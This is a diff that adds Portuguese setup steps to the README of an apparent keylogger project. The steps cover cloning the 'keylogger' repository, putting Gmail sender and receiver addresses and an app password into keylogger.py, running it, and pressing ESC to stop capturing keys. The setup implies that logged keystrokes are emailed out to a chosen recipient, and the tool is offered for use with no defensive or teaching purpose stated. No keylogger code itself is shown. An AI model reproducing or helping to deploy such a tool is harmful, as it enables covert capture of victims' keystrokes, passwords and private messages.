@@ -12,3 +12,23 @@ Instale os pacotes necessários com:
 
 ```bash
 pip install -r requirements.txt
+
+
+🚀 Como Usar
+Clone o repositório:
+
+bash
+git clone https://github.com/seu-usuario/keylogger.git
+cd keylogger
+
+Configure o e-mail em keylogger.py:
+python
+email = "seu_email@gmail.com"
+password = "sua_senha" < Senha de seguranca da Google.
+receiver_email = "email_destino@gmail.com"
+
+Execute o keylogger:
+bash
+python keylogger.py
+Parar o keylogger: Pressione ESC para interromper a captura de teclas.
+
